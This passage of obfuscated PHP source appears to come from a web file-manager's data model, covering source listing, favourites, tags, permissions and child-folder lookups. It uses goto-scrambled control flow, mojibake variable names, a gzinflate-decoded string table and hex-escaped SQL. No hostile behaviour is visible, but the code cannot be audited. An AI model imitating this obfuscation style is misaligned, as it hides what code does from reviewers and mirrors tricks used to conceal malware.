$_SERVER[ÍÓÖ€°å]; $a¨µæ…®¿ç = parent::listData($Aíø‹ÁÁ ); $B´òÉóœÛ = $this->findByName($E£°âÌ¯‘[$fÈ¦˜ªªõ¿[28]]); if (!$a¨µæ…®¿ç || $B´òÉóœÛ && $B´òÉóœÛ[$fÈ¦˜ªªõ¿[357]] != $a¨µæ…®¿ç[$fÈ¦˜ªªõ¿[357]]) { return !1; } return parent::update($Aíø‹ÁÁ , $E£°âÌ¯‘); } public function setUserJob($eÉ…Š¢÷Ê, $fé—ö½Í÷×) { goto cì¡„ËšîÅ; cì¡„ËšîÅ: $AŸ­Ò’†–¹ =& $_SERVER[ÍÓÖ€°å]; if (!is_array($fé—ö½Í÷×)) { $fé—ö½Í÷× = array($fé—ö½Í÷×); } $c¡…¿Í•Œ = parent::listData(); goto FÕß£¤”Ç²; FÕß£¤”Ç²: $døØæ®Ê„‘ = array_to_keyvalue($c¡…¿Í•Œ, $AŸ­Ò’†–¹[28]); $FŠœç±åÉŠ = $AŸ­Ò’†–¹[352]; foreach ($fé—ö½Í÷× as $eöç ¦Ê‘ô) { if ($døØæ®Ê„‘[$eöç ¦Ê‘ô]) { $FŠœç±åÉŠ .= $døØæ®Ê„‘[$eöç ¦Ê‘ô][$AŸ­Ò’†–¹[357]] . $AŸ­Ò’†–¹[47]; } else { $e§¹†¸ã’å = $this->add($eöç ¦Ê‘ô); $FŠœç±åÉŠ .= $e§¹†¸ã’å . $AŸ­Ò’†–¹[47]; } } goto CÂ¥†Ÿ³”; CÂ¥†Ÿ³”: $FŠœç±åÉŠ = rtrim($FŠœç±åÉŠ, $AŸ­Ò’†–¹[47]); Model($AŸ­Ò’†–¹[1452])->metaSet($eÉ…Š¢÷Ê, self::JOB_KEY, $FŠœç±åÉŠ); goto fƒøëíœ; fƒøëíœ: } public function getUserJob($Aµî‡ŒçêÆ) { $fí­Ò¤Ü‰ê = Model($_SERVER[ÍÓÖ€°å][1452])->metaGet($Aµî‡ŒçêÆ); return $this->getUserJobInfo($fí­Ò¤Ü‰ê[self::JOB_KEY]); } public function getUserJobInfo($A¤„ƒù‰Š) { goto b²¼ñ×­¨Ö; dó³ééìÌ±: return $C„ÒÀˆ©Û; goto A£Š„ñŸØ; a«ËÎ‡˜õ‰: $D‹÷÷„¶éÓ = array_remove_key($D‹÷÷„¶éÓ, $AéËÉô‹Óœ[175]); $C„ÒÀˆ©Û = array(); foreach ($d’ôŠ”Ô¤² as $aöß³‹å°‡) { if (isset($D‹÷÷„¶éÓ[$aöß³‹å°‡])) { $C„ÒÀˆ©Û[] = $D‹÷÷„¶éÓ[$aöß³‹å°‡]; } } goto dó³ééìÌ±; b²¼ñ×­¨Ö: $AéËÉô‹Óœ =& $_SERVER[ÍÓÖ€°å]; $d’ôŠ”Ô¤² = explode($AéËÉô‹Óœ[47], $A¤„ƒù‰Š); $D‹÷÷„¶éÓ = parent::listData(); goto a«ËÎ‡˜õ‰; A£Š„ñŸØ: } } goto eßÁ°ç ‡…; C™¤ññƒ„ö: define($_SERVER[ÍÓÖ€°å][360], $_SERVER[ÍÓÖ€°å][361]); $_SERVER[ÌîŠŸ] = explode($_SERVER[ÍÓÖ€°å][362], gzinflate(substr($_SERVER[ÍÓÖ€°å][363], 10, -8))); class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\165\x72\x63\x65"; protected $tableMeta = array("\x74\x61\142\154\x65\x4e\x61\155\x65" => "\151\157\137\163\157\x75\x72\143\x65\x5f\x6d\x65\x74\x61", "\155\145\x74\141\106\151\x65\154\144" => "\163\157\x75\162\x63\x65\x49\x44"); protected $dataAuto = array(array("\155\157\144\x69\146\171\124\151\x6d\145", "\164\x69\155\x65", "\x69\x6e\x73\x65\x72\x74", "\146\x75\x6e\143\164\151\x6f\x6e"), array("\x63\x72\x65\x61\x74\145\124\x69\155\x65", "\x74\151\x6d\145", "\x69\156\x73\x65\162\x74", "\146\165\156\143\164\x69\x6f\x6e"), array("\166\151\145\x77\124\x69\155\145", "\x74\x69\x6d\145", "\x69\156\163\145\x72\164", "\x66\165\156\x63\x74\x69\157\x6e")); protected static $cacheSourceInfo = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($dËàµ»˜èñ) { return $this->listSource(array($_SERVER[ÌîŠŸ][0] => $dËàµ»˜èñ)); } public function typeName($Dâ³ñğ×İ¢) { static $BÔİ•Œ‘ë = array(self::TYPE_SYSTEM => "\163\171\x73\x74\x65\155", self::TYPE_USER => "\165\163\x65\x72", self::TYPE_GROUP => "\x67\x72\157\165\160"); return $BÔİ•Œ‘ë[$Dâ³ñğ×İ¢ . $_SERVER[ÌîŠŸ][1]]; } public function sourceListInfo($aŠÆíôéÛÎ, $B‰˜ÖÚ‘÷› = false) { goto fòæâŸº; AäÈÇçÚÃ: if (!$B‰˜ÖÚ‘÷›) { $this->_listAppendMeta($eá„‰©ÑòÜ, $aŠÆíôéÛÎ); $this->_listAppendChildren($eá„‰©ÑòÜ, $aŠÆíôéÛÎ); } $this->_listAppendUser($eá„‰©ÑòÜ); $this->_listAppendPath($eá„‰©ÑòÜ); goto E¨À™ÌÉÕ‡; CŠ½¯‰õôÒ: $eá„‰©ÑòÜ = $this->where(array($b¨¶ªÍˆ¯Í[2] => array($b¨¶ªÍˆ¯Í[3], $aŠÆíôéÛÎ)))->select(); $this->_listAppendAuth($eá„‰©ÑòÜ); $this->_listAppendSourceInfo($eá„‰©ÑòÜ, $aŠÆíôéÛÎ); goto AäÈÇçÚÃ; fòæâŸº: $b¨¶ªÍˆ¯Í =& $_SERVER[ÌîŠŸ]; $aŠÆíôéÛÎ = array_filter(array_unique($aŠÆíôéÛÎ)); if (!$aŠÆíôéÛÎ) { return array(); } goto CŠ½¯‰õôÒ; E¨À™ÌÉÕ‡: foreach ($eá„‰©ÑòÜ as &$EËè‰˜§ïå) { $EËè‰˜§ïå = $this->pathInfoFilter($EËè‰˜§ïå); } $B¸²œä¯¢Ï = array_to_keyvalue($eá„‰©ÑòÜ, $b¨¶ªÍˆ¯Í[2]); return $B¸²œä¯¢Ï; goto cÂÜà•¢¦; cÂÜà•¢¦: } public function pathInfoFilter($A¤Ò‚Õ»ô£) { goto aï•Š–¸–Š; c‡ëÛ‘šÖÃ: if ($A¤Ò‚Õ»ô£[$D©ô­«öš£[16]] && $A¤Ò‚Õ»ô£[$D©ô­«öš£[16]][$D©ô­«öš£[17]] == -1) { $EŠ—ŒõÙĞÍ = array_remove_value($EŠ—ŒõÙĞÍ, $D©ô­«öš£[18]); $EŠ—ŒõÙĞÍ = array_remove_value($EŠ—ŒõÙĞÍ, $D©ô­«öš£[19]); $EŠ—ŒõÙĞÍ = array_remove_value($EŠ—ŒõÙĞÍ, $D©ô­«öš£[20]); $EŠ—ŒõÙĞÍ = array_remove_value($EŠ—ŒõÙĞÍ, $D©ô­«öš£[21]); $EŠ—ŒõÙĞÍ = array_remove_value($EŠ—ŒõÙĞÍ, $D©ô­«öš£[22]); $EŠ—ŒõÙĞÍ = array_remove_value($EŠ—ŒõÙĞÍ, $D©ô­«öš£[23]); } $A¤Ò‚Õ»ô£ = array_field_key($A¤Ò‚Õ»ô£, $EŠ—ŒõÙĞÍ); return $A¤Ò‚Õ»ô£; goto BÜ˜â”˜…; C˜áƒËßÇ–: $bŸæÅ¨»¸‡ .= $D©ô­«öš£[13]; $bŸæÅ¨»¸‡ .= $D©ô­«öš£[14]; $EŠ—ŒõÙĞÍ = explode($D©ô­«öš£[15], $bŸæÅ¨»¸‡); goto c‡ëÛ‘šÖÃ; aäÄ¡•Ø©™: $A¤Ò‚Õ»ô£[$D©ô­«öš£[9]] = $this->typeName($A¤Ò‚Õ»ô£[$D©ô­«öš£[9]]); if ($A¤Ò‚Õ»ô£[$D©ô­«öš£[6]] != 1) { $A¤Ò‚Õ»ô£[$D©ô­«öš£[10]] = $A¤Ò‚Õ»ô£[$D©ô­«öš£[11]]; unset($A¤Ò‚Õ»ô£[$D©ô­«öš£[11]]); } $bŸæÅ¨»¸‡ = $D©ô­«öš£[12]; goto C˜áƒËßÇ–; aï•Š–¸–Š: $D©ô­«öš£ =& $_SERVER[ÌîŠŸ]; $A¤Ò‚Õ»ô£[$D©ô­«öš£[4]] = KodIO::make($A¤Ò‚Õ»ô£[$D©ô­«öš£[2]]); $A¤Ò‚Õ»ô£[$D©ô­«öš£[5]] = $A¤Ò‚Õ»ô£[$D©ô­«öš£[6]] == 1 ? $D©ô­«öš£[7] : $D©ô­«öš£[8]; goto aäÄ¡•Ø©™; BÜ˜â”˜…: } public function listUserFav() { goto Cµ¯ˆÜÅ¢; c‡Ğ¥·‡¦á: $C¨×œ±§Šì = array_to_keyvalue($C¨×œ±§Šì, $E‚æÛ¡…È[1], $E‚æÛ¡…È[4]); if ($C¨×œ±§Šì) { $EÚ›æçœÏé = $this->listSource(array($E‚æÛ¡…È[26] => array($E‚æÛ¡…È[27], $C¨×œ±§Šì))); } $EÚ›æçœÏé = array_to_keyvalue($EÚ›æçœÏé[$E‚æÛ¡…È[28]], $E‚æÛ¡…È[2]); goto dÙ¯¬Î„Õ; Cµ¯ˆÜÅ¢: $E‚æÛ¡…È =& $_SERVER[ÌîŠŸ]; $D•–êå÷Âì = Model($E‚æÛ¡…È[24])->listData(); $C¨×œ±§Šì = array_filter_by_field($D•–êå÷Âì, $E‚æÛ¡…È[5], $E‚æÛ¡…È[25]); goto c‡Ğ¥·‡¦á; dÙ¯¬Î„Õ: foreach ($D•–êå÷Âì as &$F¢ƒ·£†¾Ô) { $F¢ƒ·£†¾Ô = array($E‚æÛ¡…È[29] => $F¢ƒ·£†¾Ô[$E‚æÛ¡…È[30]], $E‚æÛ¡…È[31] => $F¢ƒ·£†¾Ô[$E‚æÛ¡…È[32]], $E‚æÛ¡…È[33] => $F¢ƒ·£†¾Ô[$E‚æÛ¡…È[4]], $E‚æÛ¡…È[34] => $F¢ƒ·£†¾Ô[$E‚æÛ¡…È[5]], $E‚æÛ¡…È[35] => $F¢ƒ·£†¾Ô[$E‚æÛ¡…È[18]], $E‚æÛ¡…È[36] => $F¢ƒ·£†¾Ô[$E‚æÛ¡…È[19]]); if ($F¢ƒ·£†¾Ô[$E‚æÛ¡…È[5]] == $E‚æÛ¡…È[25] && $EÚ›æçœÏé[$F¢ƒ·£†¾Ô[$E‚æÛ¡…È[4]]]) { $F¢ƒ·£†¾Ô[$E‚æÛ¡…È[37]] = $EÚ›æçœÏé[$F¢ƒ·£†¾Ô[$E‚æÛ¡…È[4]]]; } } return $D•–êå÷Âì; goto aßŞÄê›¥‡; aßŞÄê›¥‡: } public function listUserTag($Aô… ‡Ü Ö) { goto AÊÉ‚ñÍÂµ; A®‘ƒß³ÎĞ: $bä™Éèê† = array_to_keyvalue($bä™Éèê†, $aĞÒ»–­ïù[1], $aĞÒ»–­ïù[4]); if (!$bä™Éèê†) { return array(); } $DŒÓŒªòæ = array($aĞÒ»–­ïù[26] => array($aĞÒ»–­ïù[27], $bä™Éèê†)); goto BàÆ†‹æ‚; AÊÉ‚ñÍÂµ: $aĞÒ»–­ïù =& $_SERVER[ÌîŠŸ]; $d®ˆãÇİâ = Model($aĞÒ»–­ïù[38])->listData(); $bä™Éèê† = array_filter_by_field($d®ˆãÇİâ, $aĞÒ»–­ïù[39], $Aô… ‡Ü Ö); goto A®‘ƒß³ÎĞ; BàÆ†‹æ‚: return $this->listSource($DŒÓŒªòæ); goto f¡Êí†îŒ–; f¡Êí†îŒ–: } public function listUserRecycle() { $EÒ¨´©— í =& $_SERVER[ÌîŠŸ]; $f„ÑáÚ¸¥á = Model($EÒ¨´©— í[40])->listData(); if (!$f„ÑáÚ¸¥á) { return array(); } $E‚ í‚ÖëŒ = array($EÒ¨´©— í[26] => array($EÒ¨´©— í[27], $f„ÑáÚ¸¥á), $EÒ¨´©— í[41] => 1); return $this->listSource($E‚ í‚ÖëŒ); } public function listSource($C²„ĞœÖ­š, $cŠæ‚Ã‡èÛ = 3000) { goto B”È«ôÅš; B”È«ôÅš: $Bº¡‡ØÁë¢ =& $_SERVER[ÌîŠŸ]; if (!isset($C²„ĞœÖ­š[$Bº¡‡ØÁë¢[42]])) { $C²„ĞœÖ­š[$Bº¡‡ØÁë¢[42]] = 0; } $b´é¦˜Î´ = $Bº¡‡ØÁë¢[43]; goto E¦øàÚ˜¸; aÚì‡øÁ·•: return $cÄªó¯™Ù»; goto bØí¥…†íˆ; E¦øàÚ˜¸: $cÄªó¯™Ù» = $this->field($b´é¦˜Î´)->_makeOrder()->where($C²„ĞœÖ­š)->selectPage($cŠæ‚Ã‡èÛ); $this->_listDataApply($cÄªó¯™Ù»[$Bº¡‡ØÁë¢[28]]); $this->_listFilterInfo($cÄªó¯™Ù»); goto aÚì‡øÁ·•; bØí¥…†íˆ: } protected function _makeOrder() { goto B·ƒ»»¿ë; B·ƒ»»¿ë: $e¶ÄŸ»ÁÈÜ =& $_SERVER[ÌîŠŸ]; $aÅ´Š ä = Model($e¶ÄŸ»ÁÈÜ[44])->get($e¶ÄŸ»ÁÈÜ[45]); $b¥ŞÓè±© = Model($e¶ÄŸ»ÁÈÜ[44])->get($e¶ÄŸ»ÁÈÜ[46]); goto b¨ĞÕêõÔ¡; F—«ãÆôÔ—: if ($CÆô›¯Ü¸… == $e¶ÄŸ»ÁÈÜ[32]) { } $fôÃÏğ¿í = $e¶ÄŸ»ÁÈÜ[54] . $bÈ‡¯¦ğª[$CÆô›¯Ü¸…] . $e¶ÄŸ»ÁÈÜ[55] . $Dº­”‰Éˆß[$FƒËöŞÈÂ…]; return $this->order(rtrim(trim($fôÃÏğ¿í), $e¶ÄŸ»ÁÈÜ[15])); goto EšÄöµÕÌ›; b¨ĞÕêõÔ¡: $Dº­”‰Éˆß = array($e¶ÄŸ»ÁÈÜ[47] => $e¶ÄŸ»ÁÈÜ[48], $e¶ÄŸ»ÁÈÜ[49] => $e¶ÄŸ»ÁÈÜ[50]); $bÈ‡¯¦ğª = array($e¶ÄŸ»ÁÈÜ[32] => $e¶ÄŸ»ÁÈÜ[32], $e¶ÄŸ»ÁÈÜ[22] => $e¶ÄŸ»ÁÈÜ[22], $e¶ÄŸ»ÁÈÜ[10] => $e¶ÄŸ»ÁÈÜ[11], $e¶ÄŸ»ÁÈÜ[20] => $e¶ÄŸ»ÁÈÜ[20], $e¶ÄŸ»ÁÈÜ[51] => $e¶ÄŸ»ÁÈÜ[21], $e¶ÄŸ»ÁÈÜ[18] => $e¶ÄŸ»ÁÈÜ[18], $e¶ÄŸ»ÁÈÜ[19] => $e¶ÄŸ»ÁÈÜ[19]); $CÆô›¯Ü¸… = Input::get($e¶ÄŸ»ÁÈÜ[52], $e¶ÄŸ»ÁÈÜ[3], $aÅ´Š ä, array_keys($bÈ‡¯¦ğª)); goto bÅéÓ¬‡Ÿ; bÅéÓ¬‡Ÿ: $FƒËöŞÈÂ… = Input::get($e¶ÄŸ»ÁÈÜ[53], $e¶ÄŸ»ÁÈÜ[3], $b¥ŞÓè±©, array_keys($Dº­”‰Éˆß)); if (!in_array($CÆô›¯Ü¸…, array_keys($bÈ‡¯¦ğª))) { $CÆô›¯Ü¸… = $e¶ÄŸ»ÁÈÜ[32]; } if (!in_array($FƒËöŞÈÂ…, array_keys($Dº­”‰Éˆß))) { $CÆô›¯Ü¸… = $e¶ÄŸ»ÁÈÜ[47]; } goto F—«ãÆôÔ—; EšÄöµÕÌ›: } protected function _listDataApplyItem($c†²…É©ßï, $eğË‹Æì—ç = false) { goto Eîœ×ÙŸË®; AòÆ§Ç¶‘ã: if (!$eğË‹Æì—ç) { $this->_listAppendMeta($c’‹¾™¶°É, $a‚óÃ’£İÇ); $this->_listAppendChildren($c’‹¾™¶°É, $a‚óÃ’£İÇ); $this->_listAppendPath($c’‹¾™¶°É); } $this->_listAppendSourceInfo($c’‹¾™¶°É, $a‚óÃ’£İÇ); $this->_listAppendUser($c’‹¾™¶°É); goto BÑŞÀ¦òª; BÑŞÀ¦òª: $b‡ÂœÈ®Üª = $this->pathInfoFilter($c’‹¾™¶°É[0]); return $b‡ÂœÈ®Üª; goto c¯ÚÊàŒ–¶; Eîœ×ÙŸË®: $c’‹¾™¶°É = array($c†²…É©ßï); $a‚óÃ’£İÇ = array($c†²…É©ßï[$_SERVER[ÌîŠŸ][2]]); $this->_listAppendAuth($c’‹¾™¶°É); goto AòÆ§Ç¶‘ã; c¯ÚÊàŒ–¶: } protected function _listDataApply(&$C•ÊÄ¹ê¬) { goto Fİí°Õ´ÁÅ; fì´óõ›Î: $c¼¡Êä¡ß® = array_unique($c¼¡Êä¡ß®); $this->_listAppendAuth($C•ÊÄ¹ê¬); $this->_listAppendMeta($C•ÊÄ¹ê¬, $c¼¡Êä¡ß®); goto BÙéğ†›İá; c§çÙ‚£“: $this->_listAppendPath($C•ÊÄ¹ê¬); goto EÍƒ½â«ö»; BÙéğ†›İá: $this->_listAppendSourceInfo($C•ÊÄ¹ê¬, $c¼¡Êä¡ß®); $this->_listAppendChildren($C•ÊÄ¹ê¬, $c¼¡Êä¡ß®); $this->_listAppendUser($C•ÊÄ¹ê¬); goto c§çÙ‚£“; Fİí°Õ´ÁÅ: $fó±ÉæšË =& $_SERVER[ÌîŠŸ]; if (!$C•ÊÄ¹ê¬) { $C•ÊÄ¹ê¬ = array(); return; } $c¼¡Êä¡ß® = array_to_keyvalue($C•ÊÄ¹ê¬, $fó±ÉæšË[1], $fó±ÉæšË[2]); goto fì´óõ›Î; EÍƒ½â«ö»: } protected function _listFilterInfo(&$dÍ­´ëÅ¯Œ) { $AÒ’Ìê¥é¾ =& $_SERVER[ÌîŠŸ]; $dÍ­´ëÅ¯Œ[$AÒ’Ìê¥é¾[56]] = array(); $dÍ­´ëÅ¯Œ[$AÒ’Ìê¥é¾[57]] = array(); foreach ($dÍ­´ëÅ¯Œ[$AÒ’Ìê¥é¾[28]] as $EøÒ³åéÊ‹) { $A—ŒåŸ® ¹ = $EøÒ³åéÊ‹[$AÒ’Ìê¥é¾[6]] == 1 ? $AÒ’Ìê¥é¾[56] : $AÒ’Ìê¥é¾[57]; $dÍ­´ëÅ¯Œ[$A—ŒåŸ® ¹][] = $this->pathInfoFilter($EøÒ³åéÊ‹); } unset($dÍ­´ëÅ¯Œ[$AÒ’Ìê¥é¾[28]]); } protected function _listAppendMeta(&$Có‹ôßİæ‚, $EïƒÊò‹›) { goto dÁé ®§ÇÛ; C®Íïè–¬›: if (!$c¥¿‚ƒîé) { return; } $dÖÏè¯À«¤ = array(); foreach ($c¥¿‚ƒîé as $FÓèšÀÖÆ÷) { if (!isset($dÖÏè¯À«¤[$FÓèšÀÖÆ÷[$bÎï–”à¯[2]]])) { $dÖÏè¯À«¤[$FÓèšÀÖÆ÷[$bÎï–”à¯[2]]] = array(); } $dÖÏè¯À«¤[$FÓèšÀÖÆ÷[$bÎï–”à¯[2]]][$FÓèšÀÖÆ÷[$bÎï–”à¯[60]]] = $FÓèšÀÖÆ÷[$bÎï–”à¯[61]]; } goto bÆâÅ÷Ñê¿; bÆâÅ÷Ñê¿: foreach ($Có‹ôßİæ‚ as &$B¤‰ ³¸Í) { $B¤‰ ³¸Í[$bÎï–”à¯[62]] = !1; if (isset($dÖÏè¯À«¤[$B¤‰ ³¸Í[$bÎï–”à¯[2]]])) { $B¤‰ ³¸Í[$bÎï–”à¯[62]] = $dÖÏè¯À«¤[$B¤‰ ³¸Í[$bÎï–”à¯[2]]]; } if ($this->fileIsLock($B¤‰ ³¸Í) && $B¤‰ ³¸Í[$bÎï–”à¯[16]]) { $b»õïĞµî = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $B¤‰ ³¸Í[$bÎï–”à¯[16]][$bÎï–”à¯[17]] = AuthModel::authDisable($B¤‰ ³¸Í[$bÎï–”à¯[16]][$bÎï–”à¯[17]], $b»õïĞµî); $B¤‰ ³¸Í[$bÎï–”à¯[16]][$bÎï–”à¯[63]][$bÎï–”à¯[16]] = $B¤‰ ³¸Í[$bÎï–”à¯[16]][$bÎï–”à¯[17]]; } } goto d´¿²˜Øå; dÁé ®§ÇÛ: $bÎï–”à¯ =& $_SERVER[ÌîŠŸ]; $FÔ³ËêÉµ² = array($bÎï–”à¯[26] => array($bÎï–”à¯[27], $EïƒÊò‹›)); $c¥¿‚ƒîé = Model($bÎï–”à¯[58])->field($bÎï–”à¯[59])->where($FÔ³ËêÉµ²)->select(); goto C®Íïè–¬›; d´¿²˜Øå: } protected function _listAppendSourceInfo(&$E† ˆÍ¥Ä, $AâÆ£Ÿ˜”) { goto D©Õ™•ö•ä; Aª—…ß˜: $AƒÉ©º„ÌÇ = Model($B÷ÜŸ¦ğ²[24])->listData(); $B‚‡â„Èá¼ = Model($B÷ÜŸ¦ğ²[65])->listSimple(); $cô°Óà = array_to_keyvalue($f‡ÎÉ–Ø, $B÷ÜŸ¦ğ²[30]); goto B™î†‹¦èë; D©Õ™•ö•ä: $B÷ÜŸ¦ğ² =& $_SERVER[ÌîŠŸ]; $f‡ÎÉ–Ø = Model($B÷ÜŸ¦ğ²[64])->listData(); $Bä—’Öíä = Model($B÷ÜŸ¦ğ²[38])->listData(); goto Aª—…ß˜; B™î†‹¦èë: $c‹Â•›Õãğ = array_to_keyvalue_group($Bä—’Öíä, $B÷ÜŸ¦ğ²[4], $B÷ÜŸ¦ğ²[39]); $Fö‘ëˆçŸÍ = array_to_keyvalue($AƒÉ©º„ÌÇ, $B÷ÜŸ¦ğ²[4]); $B®ŠÀô•š‘ = array_to_keyvalue_group($B‚‡â„Èá¼, $B÷ÜŸ¦ğ²[2]); goto cÁæÀÑëí; cÁæÀÑëí: foreach ($E† ˆÍ¥Ä as &$F— ¦øˆŠ) { $F— ¦øˆŠ[$B÷ÜŸ¦ğ²[37]] = array($B÷ÜŸ¦ğ²[66] => 0, $B÷ÜŸ¦ğ²[67] => 0, $B÷ÜŸ¦ğ²[68] => 0); if (isset($Fö‘ëˆçŸÍ[$F— ¦øˆŠ[$B÷ÜŸ¦ğ²[2]]])) { $F— ¦øˆŠ[$B÷ÜŸ¦ğ²[37]][$B÷ÜŸ¦ğ²[69]] = 1; $F— ¦øˆŠ[$B÷ÜŸ¦ğ²[37]][$B÷ÜŸ¦ğ²[70]] = $Fö‘ëˆçŸÍ[$F— ¦øˆŠ[$B÷ÜŸ¦ğ²[2]]][$B÷ÜŸ¦ğ²[32]]; } if (isset($c‹Â•›Õãğ[$F— ¦øˆŠ[$B÷ÜŸ¦ğ²[2]]])) { $F— ¦øˆŠ[$B÷ÜŸ¦ğ²[37]][$B÷ÜŸ¦ğ²[71]] = array(); foreach ($c‹Â•›Õãğ[$F— ¦øˆŠ[$B÷ÜŸ¦ğ²[2]]] as $A„ºİíÓ¸¥) { $fâ×™ãñµó = $cô°Óà[$A„ºİíÓ¸¥]; $F— ¦øˆŠ[$B÷ÜŸ¦ğ²[37]][$B÷ÜŸ¦ğ²[71]][] = array($B÷ÜŸ¦ğ²[72] => $fâ×™ãñµó[$B÷ÜŸ¦ğ²[30]], $B÷ÜŸ¦ğ²[31] => $fâ×™ãñµó[$B÷ÜŸ¦ğ²[32]], $B÷ÜŸ¦ğ²[73] => $fâ×™ãñµó[$B÷ÜŸ¦ğ²[74]]); } } if (isset($B®ŠÀô•š‘[$F— ¦øˆŠ[$B÷ÜŸ¦ğ²[2]]])) { $F— ¦øˆŠ[$B÷ÜŸ¦ğ²[37]][$B÷ÜŸ¦ğ²[75]] = array(); foreach ($B®ŠÀô•š‘[$F— ¦øˆŠ[$B÷ÜŸ¦ğ²[2]]] as $EÜ§ ¸‡ÏÖ) { $F— ¦øˆŠ[$B÷ÜŸ¦ğ²[37]][$B÷ÜŸ¦ğ²[75]] = array($B÷ÜŸ¦ğ²[76] => $EÜ§ ¸‡ÏÖ[$B÷ÜŸ¦ğ²[77]], $B÷ÜŸ¦ğ²[78] => $EÜ§ ¸‡ÏÖ[$B÷ÜŸ¦ğ²[79]], $B÷ÜŸ¦ğ²[80] => $EÜ§ ¸‡ÏÖ[$B÷ÜŸ¦ğ²[81]], $B÷ÜŸ¦ğ²[82] => $EÜ§ ¸‡ÏÖ[$B÷ÜŸ¦ğ²[83]]); } } } return $E† ˆÍ¥Ä; goto E©†Ü«ÆíÆ; E©†Ü«ÆíÆ: } protected function _listAppendChildren(&$Aß™åö ÷ù, $D •§Ï–•à) { goto E…‰”“¦ãª; AİµÙì”ô¦: for ($c­ùù¹±ä– = 0; $c­ùù¹±ä– < $aß×í„–ä¯; $c­ùù¹±ä–++) { if ($Aß™åö ÷ù[$c­ùù¹±ä–][$bâö¬¬ºë[6]]) { $B“Úí…†¹Â = $Aß™åö ÷ù[$c­ùù¹±ä–][$bâö¬¬ºë[2]]; $FÊ°‡™Íù .= "\x53\x45\x4c\x45\x43\124\x20\52\40\x46\x52\117\x4d\x20\50\x53\105\114\105\x43\124\40\47{$B“Úí…†¹Â}\x5f\150\141\x73\106\x69\x6c\x65\x27\x20\141\163\40\x68\x61\163\40\x46\122\117\x4d\40\x60{$a¥ÓÉ‘µƒ}\140\x20\xa\x9\x9\11\11\11\x77\150\x65\x72\x65\x20\160\141\x72\x65\156\x74\111\104\75{$B“Úí…†¹Â}\40\x61\156\144\x20\x69\x73\x46\157\154\144\145\x72\x3d\60\40\141\x6e\x64\x20\151\163\104\x65\x6c\x65\164\145\75\60\40\154\x69\x6d\x69\x74\40\x31\x29\40\141\x73\x20\x74\x62\61\x5f{$B“Úí…†¹Â}\x20\165\x6e\151\157\x6e\x20\x61\x6c\154\x20\12\x9\11\11\11\x9\123\x45\114\x45\x43\x54\40\52\40\106\122\117\115\40\50\x53\105\114\105\103\124\40\x27{$B“Úí…†¹Â}\x5f\150\141\x73\106\x6f\x6c\144\x65\162\x27\40\x61\x73\x20\150\141\163\x46\x69\154\145\40\x46\x52\117\115\x20\x60{$a¥ÓÉ‘µƒ}\x60\40\xa\x9\x9\x9\11\x9\x77\x68\145\162\x65\40\160\141\x72\145\x6e\x74\111\104\x3d{$B“Úí…†¹Â}\x20\x61\156\x64\x20\151\163\106\157\x6c\144\x65\162\75\61\40\x61\x6e\x64\x20\x69\163\104\x65\154\x65\x74\145\75\60\40\x6c\151\155\x69\x74\x20\x31\51\x20\x61\x73\40\164\x62\62\137{$B“Úí…†¹Â}\x20\x75\x6e\x69\157\x6e\x20\141\x6c\154\x20"; } if ((strlen($FÊ°‡™Íù) >= $Aİ…¥Õœ || $c­ùù¹±ä– == $aß×í„–ä¯ - 1) && $FÊ°‡™Íù) { $FÊ°‡™Íù = substr($FÊ°‡™Íù, 0, -strlen($bâö¬¬ºë[85])); $bÜ¸›ÉáŸ = $this->query($FÊ°‡™Íù); $cßÒò¾¢˜¶ = array_merge($cßÒò¾¢˜¶, $bÜ¸›ÉáŸ); $FÊ°‡™Íù = $bâö¬¬ºë[1]; } } $cßÒò¾¢˜¶ = array_to_keyvalue($cßÒò¾¢˜¶, $bâö¬¬ºë[86], $bâö¬¬ºë[86]); foreach ($Aß™åö ÷ù as &$CßÜ¢ôë±¡) { if ($CßÜ¢ôë±¡[$bâö¬¬ºë[6]]) { unset($CßÜ¢ôë±¡[$bâö¬¬ºë[11]]); $CßÜ¢ôë±¡[$bâö¬¬ºë[87]] = isset($cßÒò¾¢˜¶[$CßÜ¢ôë±¡[$bâö¬¬ºë[2]] . $bâö¬¬ºë[88]]); $CßÜ¢ôë±¡[$bâö¬¬ºë[89]] = isset($cßÒò¾¢˜¶[$CßÜ¢ôë±¡[$bâö¬¬ºë[2]] . $bâö¬¬ºë[90]]); } } goto BßŠ§±Êˆù; E…‰”“¦ãª: $bâö¬¬ºë =& $_SERVER[ÌîŠŸ]; $FÊ°‡™Íù = $bâö¬¬ºë[84]; $cßÒò¾¢˜¶ = array(); goto E¯¼‹à‡ƒ´; E¯¼‹à‡ƒ´: $Aİ…¥Õœ = 1024 * 50; $aß×í„–ä¯ = count($Aß™åö ÷ù); $a¥ÓÉ‘µƒ = $this->tablePrefix . $this->tableName; goto AİµÙì”ô¦; BßŠ§±Êˆù: } protected function _listAppendAuth(&$B¡ÂØÌô‘) { goto dŒÄ§ƒ›³Ô; a‡œ‡²™ºš: foreach ($B¡ÂØÌô‘ as $dè…¸ƒÏ°¾ => &$FóÀ‚ğø¹í) { $FóÀ‚ğø¹í[$aÄ‡»Ü³“ß[16]] = $dóæº®¤„½[$FóÀ‚ğø¹í[$aÄ‡»Ü³“ß[2]]]; if (!$FóÀ‚ğø¹í[$aÄ‡»Ü³“ß[16]] && $FóÀ‚ğø¹í[$aÄ‡»Ü³“ß[9]] == self::TYPE_GROUP) { $FóÀ‚ğø¹í[$aÄ‡»Ü³“ß[16]] = Action($aÄ‡»Ü³“ß[92])->pathGroupAuthMake($FóÀ‚ğø¹í[$aÄ‡»Ü³“ß[93]]); if (!$FóÀ‚ğø¹í[$aÄ‡»Ü³“ß[16]] && !$GLOBALS[$aÄ‡»Ü³“ß[94]]) { $FóÀ‚ğø¹í[$aÄ‡»Ü³“ß[95]] = !1; $FóÀ‚ğø¹í[$aÄ‡»Ü³“ß[96]] = !1; } } if ($FóÀ‚ğø¹í[$aÄ‡»Ü³“ß[16]]) { $FóÀ‚ğø¹í[$aÄ‡»Ü³“ß[95]] = AuthModel::authCheckEdit($FóÀ‚ğø¹í[$aÄ‡»Ü³“ß[16]][$aÄ‡»Ü³“ß[17]]); $FóÀ‚ğø¹í[$aÄ‡»Ü³“ß[96]] = AuthModel::authCheckView($FóÀ‚ğø¹í[$aÄ‡»Ü³“ß[16]][$aÄ‡»Ü³“ß[17]]); } $this->groupPathDisplay($FóÀ‚ğø¹í); } goto 